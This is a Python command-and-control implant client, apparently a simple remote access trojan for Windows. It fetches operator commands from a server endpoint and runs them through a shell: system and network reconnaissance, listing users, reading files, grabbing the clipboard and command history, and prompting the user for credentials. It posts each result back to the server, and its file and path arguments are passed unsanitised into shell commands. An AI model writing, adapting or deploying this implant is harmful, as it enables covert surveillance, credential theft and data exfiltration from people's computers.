# Author : Maximilien Schmitt-Laurin

from datetime import datetime
import aiohttp
import asyncio
import sys
import json
from subprocess import PIPE, run


async def main():

    async with aiohttp.ClientSession() as session:

        # Client makes a GET request for instructions (will hit an endpoint on the server).

        async with session.get('http://127.0.0.1:7000/validate/status') as resp:

            print(resp.status)

            # Server returns C2 instructions from the operator.

            jsonStr = await resp.text()
            cmds = json.loads(jsonStr)


            # Client executes each instruction one by one and then sends the result
            # to the server.

            for command in cmds:

                if command == "pwd" or command == "cd":

                    result = run('cd', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://127.0.0.1:7000/validate/status/3', data=result.stdout)
                
                if command == "whoami":

                    result = run('whoami', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://127.0.0.1:7000/validate/status/13', data=result.stdout)

                if command == "ls":

                    result = run('dir', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://127.0.0.1:7000/validate/status/5', data=result.stdout)

                if 'ls' in command and command != "ls":

                    commandKeywordList = command.split()
                    path = commandKeywordList[1]

                    powershellCommand = "dir " + path
                    result = run(powershellCommand, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://127.0.0.1:7000/validate/status/5', data=result.stdout)

                      
                if command == "systeminfo":

                    result = run('systeminfo', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://127.0.0.1:7000/validate/status/14', data=result.stdout)


                if 'cat' in command and command != "cat":

                    commandKeywordList = command.split()
                    filename = commandKeywordList[1]

                    powershellCommand = "type " + filename
                    result = run(powershellCommand, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://127.0.0.1:7000/validate/status/15', data=result.stdout)


                if command == "listusers":

                    result = run('net user', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://127.0.0.1:7000/validate/status/10', data=result.stdout)


                if command == "ipconfig":

                    result = run('ipconfig /all', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://127.0.0.1:7000/validate/status/9', data=result.stdout)


                if command == "clipboard":

                    result = run('powershell get-clipboard', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://127.0.0.1:7000/validate/status/6', data=result.stdout)


                if command == "connections":

                    result = run('netstat -a', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

                    await session.post('http://127.0.0.1:7000/validate/status/8', data=result.stdout)


                if command == "prompt":

                    promptData = input(" Enter some credentials here : ")
                    await session.post('http://127.0.0.1:7000/validate/status/7', data=promptData)


                if command == "userhist":

                    result = run('doskey /history', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
                    await session.post('http://127.0.0.1:7000/validate/status/11', data=result.stdout)


    await main()


if __name__ ==  '__main__':
    asyncio.run(main())